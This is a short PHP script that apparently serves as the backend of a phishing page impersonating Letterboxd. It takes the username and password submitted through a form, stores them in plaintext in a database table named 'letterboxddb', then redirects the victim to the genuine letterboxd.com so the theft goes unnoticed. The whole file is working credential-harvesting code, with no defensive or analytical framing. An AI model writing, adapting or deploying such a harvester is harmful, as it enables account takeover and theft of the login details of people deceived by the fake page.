<?php
// 1. SETUP & CONNECTION
// Load database connection info from environment variables
$host = getenv('DB_HOST');
$port = getenv('DB_PORT') ?: 5432;
$dbname = getenv('DB_NAME');
$user = getenv('DB_USER');
$pass = getenv('DB_PASS');

try {
  // Connect to PostgreSQL
  $dsn = "pgsql:host=$host;port=$port;dbname=$dbname";
  $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);

  // 2. HANDLE FORM SUBMISSION
  if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Get values using the correct names
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if (!empty($username) && !empty($password)) {
      // Insert into database
      $stmt = $pdo->prepare("INSERT INTO letterboxddb (username, password) VALUES (:username, :password)");
      $stmt->execute([
        ':username' => $username,
        ':password' => $password
      ]);

      // Redirect after saving
      header("Location: https://letterboxd.com/");
      exit;
    }
  }
} catch (PDOException $e) {
  // For testing, print the error so we know if connection fails
  echo "Database Error: " . $e->getMessage();
}
?>